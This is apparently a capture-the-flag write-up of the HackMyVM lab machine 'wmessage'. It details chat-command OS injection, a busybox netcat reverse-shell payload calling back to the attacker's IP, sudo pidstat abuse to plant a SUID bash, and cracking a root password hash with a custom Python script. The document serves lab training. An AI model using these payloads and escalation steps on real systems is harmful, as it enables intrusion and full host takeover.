# wmessage

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| wmessage | WWFYMN | Beginner | HackMyVM |

**Summary:** The `wmessage` machine hosts a custom web-based messaging application on port 80 that exposes a server-side command injection vulnerability through a special `!mpstat` command feature built into the chat interface. After registering an account and logging in, it was discovered that the application pipes user message input directly into a shell command when the `!mpstat` prefix is used, allowing arbitrary OS command injection via semicolon chaining (e.g., `!mpstat ; id`). This was leveraged to obtain a reverse shell as `www-data`. Post-exploitation enumeration revealed that `www-data` could run `/bin/pidstat` as `messagemaster` without a password via `sudo`. Using the GTFOBins `pidstat -e` technique, a SUID copy of bash (`msh`) was planted in `messagemaster`'s home directory, then used to escalate to a full `messagemaster` shell. As `messagemaster`, a `ROOTPASS` file was found in `/var/www`, readable only by root, but `messagemaster` could run `/bin/md5sum` as any user via `sudo NOPASSWD`. The MD5 hash of `ROOTPASS` was extracted via `sudo md5sum`, and a custom Python script cracking the hash against `rockyou.txt` (accounting for a trailing newline in the hashed content) recovered the root password in plaintext. SSH or `su` into root completed the chain, yielding both the `User.txt` and `Root.txt` flags.

---

## Reconnaissance

### Host Discovery

The target was identified on the local virtual network using a custom PowerShell network scanner:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.134 08:00:27:92:32:BC VirtualBox
```

The target IP is **192.168.100.134**, identified as a VirtualBox VM by its OUI.

---

### Port Scan — Nmap

A full-port, service-version, and default-script scan was conducted:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/wmessage]
└─$ nmap -sC -sV -p- -T4 192.168.100.134
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 14:55 WIB
Nmap scan report for 192.168.100.134
Host is up (0.052s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 62:8e:95:58:1e:ee:94:d1:56:0e:e5:51:f5:45:38:43 (RSA)
|   256 45:a8:7e:56:7f:df:b0:83:65:6c:88:68:19:a4:86:6c (ECDSA)
|_  256 bc:54:24:a6:0a:8b:6d:34:dc:a6:ab:80:98:ee:1f:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
| http-title: Login
|_Requested resource was /login?next=%2F
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.99 seconds
```

**Findings:**
- **Port 22** — OpenSSH 8.4p1 (Debian 11)
- **Port 80** — Apache 2.4.54, serving a web application with a login page at `/login`

---

### Web Directory Enumeration — Gobuster

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/wmessage]
└─$ gobuster dir -u http://192.168.100.134/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x txt,php,js,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.134/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 323] [--> http://192.168.100.134/javascript/]
/login                (Status: 200) [Size: 2472]
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/manual               (Status: 301) [Size: 319] [--> http://192.168.100.134/manual/]
/server-status        (Status: 403) [Size: 280]
/sign-up              (Status: 200) [Size: 2843]
/user                 (Status: 302) [Size: 225] [--> /login?next=%2Fuser]
Progress: 23750 / 23750 (100.00%)
===============================================================
Finished
===============================================================
```

Key endpoints discovered:
- `/login` — Login page (200)
- `/sign-up` — Self-registration available (200)
- `/user` — Authenticated user area (redirects to login)

---

## Initial Access

### Web Application — Login Page

Navigating to `http://192.168.100.134/` redirects to the login page. It accepts an **Email Address** and **Password**, and user self-registration is available via `/sign-up`.

![](image.png)

A new account was registered via `/sign-up` and logged in successfully.

---

### Discovering the Command Injection Vector

After authenticating, the application presents a real-time messaging interface titled **"Messages"**. A pre-existing message from user **Master** is visible and reads:

> *"Hi, This is finally working. I spent a month on this messaging system I hope there are no bugs in it. use `!mpstat` to get the status of the server."*

This is a critical hint: the application processes messages that begin with `!mpstat` as a server-side shell command — passing user-controlled input to the OS. Sending `!mpstat` alone returns live CPU statistics from the server, confirming that the backend is executing the actual `mpstat` binary and embedding its stdout into the chat response.

![](image-1.png)

The `mpstat` output visible in the chat confirms the server kernel version: **Linux 5.10.0-19-amd64 (MSG)**, x86_64 architecture, 1 CPU.

---

### Confirming Remote Code Execution

To verify command injection, a semicolon was appended to chain the `id` command: `!mpstat ; id`. The server response appended the output of `id` directly to the `mpstat` output, confirming unauthenticated OS command execution as the web server user.

![](image-2.png)

The image clearly shows the server response containing:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
This confirms RCE running as **www-data**. Note that `$(id)` and backtick substitution were echoed literally — only the `!mpstat ; <cmd>` chaining technique worked, as the backend specifically invokes `mpstat` when the `!` prefix is detected and passes remaining input to the shell.

---

### Reverse Shell

A Netcat listener was set up on the attacker machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/wmessage]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

The reverse shell payload was delivered through the message input box using BusyBox netcat (commonly available on Debian systems):

```
!mpstat ; busybox nc 192.168.100.1 4444 -e /bin/bash
```

![](image-3.png)

The connection was immediately received:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59960
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@MSG:/$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/wmessage]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@MSG:/$ export SHELL=bash
www-data@MSG:/$ export TERM=xterm
www-data@MSG:/$ stty rows 72 cols 158
```

A fully interactive TTY shell was established as **www-data** via the classic `python3 pty.spawn` + `stty raw -echo; fg` upgrade technique.

---

### Internal Enumeration

```bash
www-data@MSG:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
messagemaster:x:1000:1000:MessageMaster,,,:/home/messagemaster:/bin/bash
WM:x:1001:1001::/home/WM:/bin/sh
www-data@MSG:/$ ls -la /home/*
/home/WM:
total 24
drwxr-xr-x 3 WM   WM   4096 Nov 29  2022 .
drwxr-xr-x 4 root root 4096 Nov 21  2022 ..
-rw------- 1 WM   WM      0 Nov 22  2022 .bash_history
-rw-r--r-- 1 WM   WM    220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 WM   WM   3526 Mar 27  2022 .bashrc
drwxr-xr-x 3 WM   WM   4096 Nov 21  2022 .local
-rw-r--r-- 1 WM   WM    807 Mar 27  2022 .profile

/home/messagemaster:
total 28
drwxr-xr-x 3 messagemaster messagemaster 4096 Nov 22  2022 .
drwxr-xr-x 4 root          root          4096 Nov 21  2022 ..
-rw------- 1 messagemaster messagemaster    0 Nov 22  2022 .bash_history
-rw-r--r-- 1 messagemaster messagemaster  220 Nov 12  2022 .bash_logout
-rw-r--r-- 1 messagemaster messagemaster 3526 Nov 12  2022 .bashrc
drwxr-xr-x 3 messagemaster messagemaster 4096 Nov 22  2022 .local
-rw-r--r-- 1 messagemaster messagemaster  807 Nov 12  2022 .profile
-rw------- 1 messagemaster messagemaster   33 Nov 22  2022 User.txt
```

Two non-root users exist: **messagemaster** (uid=1000) and **WM** (uid=1001). The `User.txt` flag is in `messagemaster`'s home directory, unreadable by `www-data`.

---

## Privilege Escalation

### www-data → messagemaster (via pidstat GTFOBins)

Checking `sudo` privileges for `www-data`:

```bash
www-data@MSG:/home/messagemaster$ which sudo
/usr/bin/sudo
www-data@MSG:/home/messagemaster$ sudo -l
Matching Defaults entries for www-data on MSG:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on MSG:
    (messagemaster) NOPASSWD: /bin/pidstat
```

`www-data` can execute `/bin/pidstat` as `messagemaster` without a password. Consulting GTFOBins for `pidstat`:

![](image-4.png)

GTFOBins confirms that `pidstat` supports a `-e` flag to execute an arbitrary command, and since `sudo` does not drop privileges, the spawned process runs as the target user. The command `pidstat -e /bin/sh` is the canonical technique.

```bash
www-data@MSG:/home/messagemaster$ ls -la /bin/pidstat
-rwxr-xr-x 1 root root 72000 Feb  3  2021 /bin/pidstat
www-data@MSG:/home/messagemaster$ file /bin/pidstat
/bin/pidstat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b3fdfa2143f2facd706ca56c1540cd2dfd2c7aa7, for GNU/Linux 3.2.0, stripped
www-data@MSG:/home/messagemaster$ sudo -u messagemaster /bin/pidstat -e /bin/bash
Linux 5.10.0-19-amd64 (MSG)     02/27/26        _x86_64_        (1 CPU)

08:12:09      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
08:12:09     1000      1112    0.00    0.00    0.00    0.00    0.00     0  pidstat
www-data@MSG:/home/messagemaster$ bash: initialize_job_control: no job control in background: Bad file descriptor
messagemaster@MSG:~$
exit
www-data@MSG:/home/messagemaster$
```

The shell spawned but immediately exited due to the non-interactive TTY context ("no job control in background"). Since a direct shell session was unstable, an alternative SUID binary approach was used:

**Step 1** — Copy `/bin/bash` to `messagemaster`'s home directory as `messagemaster`:

```bash
www-data@MSG:/home/messagemaster$ sudo -u messagemaster /bin/pidstat -e /bin/cp /bin/bash /home/messagemaster/msh
Linux 5.10.0-19-amd64 (MSG)     02/27/26        _x86_64_        (1 CPU)

08:17:39      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
08:17:39     1000      1166    0.00    0.00    0.00    0.00    0.00     0  pidstat
```

**Step 2** — Set the SUID bit on the copied binary, running as `messagemaster`:

```bash
www-data@MSG:/home/messagemaster$ sudo -u messagemaster /bin/pidstat -e /bin/chmod +s /home/messagemaster/msh
Linux 5.10.0-19-amd64 (MSG)     02/27/26        _x86_64_        (1 CPU)

08:17:49      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
08:17:49     1000      1169    0.00    0.00    0.00    0.00    0.00     0  pidstat
```

**Step 3** — Execute `msh -p` to invoke bash in privileged mode, honoring the SUID euid:

```bash
www-data@MSG:/home/messagemaster$ /home/messagemaster/msh -p
msh-5.1$ id
uid=33(www-data) gid=33(www-data) euid=1000(messagemaster) egid=1000(messagemaster) groups=1000(messagemaster),33(www-data)
```

The effective UID is now **1000 (messagemaster)**. To get a clean full session, `os.setresuid` was used via Python to permanently set all UIDs:

```bash
msh-5.1$ python3 -c 'import os; os.setresgid(1000, 1000, 1000); os.setresuid(1000, 1000, 1000); os.system("/bin/bash")'
messagemaster@MSG:/home/messagemaster$ id
uid=1000(messagemaster) gid=1000(messagemaster) groups=1000(messagemaster),33(www-data)
```

Full shell as **messagemaster** achieved.

---

### messagemaster → root (via md5sum + custom hash cracker)

Checking the environment and `sudo` privileges for `messagemaster`:

```bash
messagemaster@MSG:/home/messagemaster$ cd
messagemaster@MSG:~$ ls -la
total 16
drwxr-xr-x  3 root     root     4096 Nov 21  2022 .
drwxr-xr-x 12 root     root     4096 Nov 20  2022 ..
-rw-r-----  1 root     root       12 Nov 21  2022 ROOTPASS
drwxrwxr--  5 www-data www-data 4096 Nov 18  2022 html
messagemaster@MSG:~$ sudo -l
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum
messagemaster@MSG:~$ pwd
/var/www
```

Critical observations:
- `ROOTPASS` file exists in `/var/www`, owned by **root** with permissions `rw-r-----` — readable by root only.
- `messagemaster` can run `/bin/md5sum` as **ANY** user (including root) without a password.

The MD5 hash of the root password file was extracted by running `md5sum` as root:

```bash
messagemaster@MSG:~$ sudo /bin/md5sum /var/www/ROOTPASS
85c73111b30f9ede8504bb4a4b682f48  /var/www/ROOTPASS
```

#### Hash Cracking Attempt — John the Ripper

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/wmessage]
└─$ john --format=Raw-MD5 hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2026-02-27 15:41) 0g/s 18872Kp/s 18872Kc/s 18872KC/s  fuckyooh21..*7¡Vamos!
Session completed.
```

#### Hash Cracking Attempt — Hashcat

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/wmessage]
└─$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-7300U CPU @ 2.60GHz, 1394/2789 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2900 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: 85c73111b30f9ede8504bb4a4b682f48
Time.Started.....: Fri Feb 27 15:42:55 2026 (6 secs)
Time.Estimated...: Fri Feb 27 15:43:01 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2099.6 kH/s (0.30ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 41%

Started: Fri Feb 27 15:42:52 2026
Stopped: Fri Feb 27 15:43:03 2026
```

Both John and Hashcat exhausted the full `rockyou.txt` wordlist without a match. The reason: `md5sum` computes the hash of the **raw file content**, which in this case includes a **trailing newline character (`\n`)** appended by the text editor that created the file. Standard password crackers hash words without a trailing newline, causing a mismatch.

#### Custom Python Cracker — Accounting for the Trailing Newline

A targeted Python script was written to test each rockyou candidate both with and without a trailing `\n`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/wmessage]
└─$ cat crack.py
import hashlib

target_hash = "85c73111b30f9ede8504bb4a4b682f48"
wordlist_path = "/usr/share/wordlists/rockyou.txt"

def crack():
    try:
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            for line in f:
                word = line.strip()

                variations = [word, word + "\n"]

                for v in variations:
                    guess = hashlib.md5(v.encode()).hexdigest()
                    if guess == target_hash:
                        print(f"[+] FOUND IT: {repr(v)}")
                        return
    except FileNotFoundError:
        print("Wordlist not found!")

crack()
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/wmessage]
└─$ python3 crack.py
[+] FOUND IT: 'M[REDACTED]\n'
```

The password was found — it matched the wordlist entry **with a trailing newline**, confirming that the `ROOTPASS` file was created with a text editor that appended `\n` to the content, and `md5sum` hashed the entire file byte-for-byte including that newline.

---

### Root Shell & Flags

Using the recovered password to `su` into root:

```bash
messagemaster@MSG:/home/messagemaster$ su - root
Password:
root@MSG:~# id
uid=0(root) gid=0(root) groups=0(root)
root@MSG:~# whoami ; hostname
root
MSG
root@MSG:~# cat /home/messagemaster/User.txt /root/Root.txt
ea8[REDACTED]
a59[REDACTED]
```

Both flags captured. Full root compromise achieved.

---

## Attack Chain Summary

1. **Reconnaissance** — Network scan identified target `192.168.100.134` running Apache 2.4.54 on port 80 and OpenSSH 8.4p1 on port 22. Gobuster discovered a `/sign-up` endpoint enabling self-registration on the messaging web app.

2. **Vulnerability Discovery** — After registering and logging in, a message from the application's "Master" user disclosed an undocumented `!mpstat` command that triggers server-side execution of the `mpstat` binary. Testing with `!mpstat ; id` confirmed OS command injection via semicolon chaining, executing as `www-data`.

3. **Exploitation** — A reverse shell was triggered through the chat input box using the payload `!mpstat ; busybox nc 192.168.100.1 4444 -e /bin/bash`, establishing an interactive TTY shell as `www-data` on the target host `MSG`.

4. **Internal Enumeration** — Post-shell enumeration via `sudo -l` revealed that `www-data` could execute `/bin/pidstat` as `messagemaster` without a password. The GTFOBins `pidstat -e` technique was used to copy `/bin/bash` to a SUID binary (`msh`) owned by `messagemaster`, which was then used to escalate to a full `messagemaster` shell via Python `setresuid`.

5. **Privilege Escalation** — As `messagemaster`, a `ROOTPASS` file in `/var/www` (root-owned, unreadable by others) was identified. The `sudo NOPASSWD: /bin/md5sum` privilege allowed reading its MD5 hash. Standard cracking tools failed due to a trailing newline in the file. A custom Python script testing `word + "\n"` variations against `rockyou.txt` recovered the plaintext root password, which was used with `su - root` to achieve a full root shell and capture both flags.
